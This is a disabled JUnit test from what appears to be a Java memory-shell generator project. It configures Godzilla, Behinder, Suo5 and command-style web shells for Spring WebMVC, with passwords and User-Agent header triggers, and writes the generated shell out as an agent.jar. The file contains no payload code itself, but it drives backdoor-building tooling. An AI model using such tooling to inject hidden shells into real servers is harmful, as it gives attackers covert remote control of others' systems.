package com.reajason.javaweb.memshell;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.memshell.config.*;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.jar.JarPacker;
import lombok.SneakyThrows;
import net.bytebuddy.jar.asm.Opcodes;
import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.Test;

import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * @author ReaJason
 * @since 2025/2/22
 */
class GeneratorMainTest {

    @Test
    @SneakyThrows
    @Disabled
    void test() {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.SpringWebMvc)
                .shellTool(ShellTool.Godzilla)
                .shellType(ShellType.SPRING_WEBMVC_AGENT_FRAMEWORK_SERVLET)
                .targetJreVersion(Opcodes.V1_8)
                .debug(true)
//                .shrink(true)
                .build();
        GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                .pass("pass")
                .key("key")
                .headerName("User-Agent")
                .headerValue("test123").build();
        CommandConfig commandConfig = CommandConfig.builder()
                .paramName("listener")
                .encryptor(CommandConfig.Encryptor.DOUBLE_BASE64)
                .build();

        BehinderConfig behinderConfig = BehinderConfig.builder()
                .pass("test123")
                .headerName("User-Agent")
                .headerValue("test").build();

        Suo5Config suo5Config = Suo5Config.builder()
                .headerName("User-Agent")
                .headerValue("test").build();

        InjectorConfig injectorConfig = new InjectorConfig();

        MemShellResult generateResult = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);
        if (generateResult != null) {
            Packers.GzipBase64.getInstance().pack(generateResult.toClassPackerConfig());

            Files.write(Paths.get("agent.jar"), ((JarPacker) Packers.AgentJar.getInstance()).packBytes(generateResult.toJarPackerConfig()));
//            System.out.println(generateResult.getShellBytes().length);
//            Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
//            Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
        }
    }
}